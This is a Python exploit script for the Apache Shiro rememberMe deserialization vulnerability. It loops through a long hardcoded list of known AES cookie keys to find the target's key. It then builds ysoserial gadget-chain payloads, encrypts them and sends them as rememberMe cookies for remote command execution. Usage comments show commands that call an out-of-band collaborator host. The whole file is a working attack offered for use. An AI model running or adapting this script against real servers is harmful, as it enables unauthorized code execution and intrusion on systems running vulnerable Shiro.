import sys,time
import base64
import uuid
#from random import Random
import requests
import subprocess
from Crypto.Cipher import AES

#check: python3 shiro.py URLDNS "http://xxxx.ceye.io"

#exploit:
#python3 shiro.py CommonsCollections6 "curl xxx.burpcollaborator.net" http://127.0.0.1:9080/

#java -cp ysoserial.jar ysoserial.exploit.JRMPListener 19999 CommonsCollections6 "curl xxx"
#python3 shiro.py JRMPClient "ip:19999"

keys = ["1AvVhdsgUs0FSA3SDFAdag==","1QWLxg+NYmxraMoxAXu/Iw==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==","5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==","7AvVhmFLUs0KTA3Kprsdag==","9AvVhmFLUs0KTA3Kprsdag==","a2VlcE9uR29pbmdBbmRGaQ==","bWluZS1hc3NldC1rZXk6QQ==","fCq+/xW488hMTCD+cmJ3aQ==","Is9zJ3pzNh2cgTHB4ua3+Q==","kPH+bIxk5D2deZiIxcaaaA==","kPv59vyqzj00x11LXJZTjJ2UHW48jzHN","L7RioUULEFhRyxM7a2R/Yg==","OY//C4rhfwNxCQAQCrQQ1Q==","r0e3c16IdVkouZgk1TKVMg==","U3ByaW5nQmxhZGUAAAAAAA==","WcfHGU25gNnTxTlmJMeSpw==","wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","ZAvph3dsQs0FSL3SDFAdag==","ZUdsaGJuSmxibVI2ZHc9PQ==","4AvVhmFLUs0KTA3Kprsdag==","Z3VucwAAAAAAAAAAAAAAAA==","fCq+/xW488hMTCD+cmJ3aQ==","0AvVhmFLUs0KTA3Kprsdag==","1AvVhdsgUs0FSA3SDFAdag==","1QWLxg+NYmxraMoxAXu/Iw==","25BsmdYwjnfcWmnhAciDDg==","2AvVhdsgUs0FSA3SDFAdag==","3JvYhmBLUs0ETA5Kprsdag==","r0e3c16IdVkouZgk1TKVMg==","5aaC5qKm5oqA5pyvAAAAAA==","5AvVhmFLUs0KTA3Kprsdag==","6AvVhmFLUs0KTA3Kprsdag==","6NfXkC7YVCV5DASIrEm1Rg==","6ZmI6I2j5Y+R5aSn5ZOlAA==","cmVtZW1iZXJNZQAAAAAAAA==","7AvVhmFLUs0KTA3Kprsdag==","8AvVhmFLUs0KTA3Kprsdag==","8BvVhmFLUs0KTA3Kprsdag==","9AvVhmFLUs0KTA3Kprsdag==","OUHYQzxQ/W9e/UjiAGu6rg==","a3dvbmcAAAAAAAAAAAAAAA==","aU1pcmFjbGVpTWlyYWNsZQ==","bWljcm9zAAAAAAAAAAAAAA==","bWluZS1hc3NldC1rZXk6QQ==","bXRvbnMAAAAAAAAAAAAAAA==","ZUdsaGJuSmxibVI2ZHc9PQ==","wGiHplamyXlVB11UXWol8g==","U3ByaW5nQmxhZGUAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","L7RioUULEFhRyxM7a2R/Yg==","a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw==","OY//C4rhfwNxCQAQCrQQ1Q==","5J7bIJIV0LQSN3c9LPitBQ==","f/SY5TIve5WWzT4aQlABJA==","bya2HkYo57u6fWh5theAWw==","WuB+y2gcHRnY2Lg9+Aqmqg==","kPv59vyqzj00x11LXJZTjJ2UHW48jzHN","3qDVdLawoIr1xFd6ietnwg==","YI1+nBV//m7ELrIyDHm6DQ==","2A2V+RFLUs+eTA3Kpr+dag==","6ZmI6I2j3Y+R1aSn5BOlAA==","SkZpbmFsQmxhZGUAAAAAAA==","2cVtiE83c4lIrELJwKGJUw==","fsHspZw/92PrS3XrPW+vxw==","XTx6CKLo/SdSgub+OPHSrw==","sHdIjUN6tzhl8xZMG3ULCQ==","O4pdf+7e+mZe8NyxMTPJmQ==","HWrBltGvEZc14h9VpMvZWw==","rPNqM6uKFCyaL10AK51UkQ==","Y1JxNSPXVwMkyvES/kJGeQ==","lT2UvDUmQwewm6mMoiw4Ig==","MPdCMZ9urzEA50JDlDYYDg==","xVmmoltfpb8tTceuT5R7Bw==","c+3hFGPjbgzGdrC+MHgoRQ==","ClLk69oNcA3m+s0jIMIkpg==","Bf7MfkNR0axGGptozrebag==","1tC/xrDYs8ey+sa3emtiYw==","ZmFsYWRvLnh5ei5zaGlybw==","cGhyYWNrY3RmREUhfiMkZA==","IduElDUpDDXE677ZkhhKnQ==","yeAAo1E8BOeAYfBlm4NG9Q==","cGljYXMAAAAAAAAAAAAAAA==","2itfW92XazYRi5ltW0M2yA==","XgGkgqGqYrix9lI6vxcrRw==","ertVhmFLUs0KTA3Kprsdag==","5AvVhmFLUS0ATA4Kprsdag==","s0KTA3mFLUprK4AvVhsdag==","hBlzKg78ajaZuTE0VLzDDg==","9FvVhtFLUs0KnA3Kprsdyg==","d2ViUmVtZW1iZXJNZUtleQ==","yNeUgSzL/CfiWw1GALg6Ag==","NGk/3cQ6F5/UNPRh8LpMIg==","4BvVhmFLUs0KTA3Kprsdag==","MzVeSkYyWTI2OFVLZjRzZg==","empodDEyMwAAAAAAAAAAAA==","A7UzJgh1+EWj5oBFi+mSgw==","c2hpcm9fYmF0aXMzMgAAAA==","i45FVt72K2kLgvFrJtoZRw==","U3BAbW5nQmxhZGUAAAAAAA==","ZnJlc2h6Y24xMjM0NTY3OA==","Jt3C93kMR9D5e8QzwfsiMw==","MTIzNDU2NzgxMjM0NTY3OA==","vXP33AonIp9bFwGl7aT7rA==","V2hhdCBUaGUgSGVsbAAAAA==","Q01TX0JGTFlLRVlfMjAxOQ==","ZAvph3dsQs0FSL3SDFAdag==","Is9zJ3pzNh2cgTHB4ua3+Q==","NsZXjXVklWPZwOfkvk6kUA==","GAevYnznvgNCURavBhCr1w==","66v1O8keKNV3TTcGPK1wzg==","SDKOLKn2J1j/2BHjeZwAoQ=="]
headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 Zxxz/1.0","Connection":"close"}
shiro_key=""
def encode_rememberme(payload,command):
    print (command)
    popen = subprocess.Popen(['java', '-jar', '/Users/aresx/tools/ysoserial.jar', payload,command], stdout=subprocess.PIPE,)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key,), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
def encode(ser):
    ser = open(ser,"rb").read()
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key,), mode, iv)
    file_body = pad(ser)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def check_key(url):
    global shiro_key
    checker="rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AC5jb20uamVlY21zLmNvcmUuc2VjdXJpdHkuQ21zQXV0aG9yaXppbmdSZWFsbV8wc3IAF2phdmEudXRpbC5MaW5rZWRIYXNoU2V02GzXWpXdKh4CAAB4cgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAF0AAVhZG1pbnh4AHcBAXEAfgAFeA=="
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    for key in keys:
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body=pad(base64.b64decode(checker))
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        cookie={"rememberMe":base64_ciphertext.decode()}
        
        rsp = requests.get(url,cookies=cookie,headers=headers,allow_redirects=False)
        #print (rsp.headers['Set-Cookie'])
        if rsp.status_code ==200 or rsp.status_code==302:
            if "rememberMe=deleteMe" not in rsp.headers['Set-Cookie']:
                print ("Key Found: {}".format(key))
                shiro_key=key
                break
            else :
                pass
    if shiro_key == "":
        print ("Not Found")

if __name__ == '__main__':

    if sys.argv[1] == "check":
        check_key(sys.argv[2])
    elif sys.argv[1] == "encode":
        payload = encode(sys.argv[2])
        url = sys.argv[3]
        requests.get(url,cookies={'rememberMe':payload.decode()})
    else:
        payload = encode_rememberme(sys.argv[1],sys.argv[2])
        url = sys.argv[3]
        requests.get(url,cookies={'rememberMe':payload.decode()})
        #print(payload.decode())
        with open("payload.cookie", "w") as fpw:
            print("rememberMe={}".format(payload.decode()), file=fpw)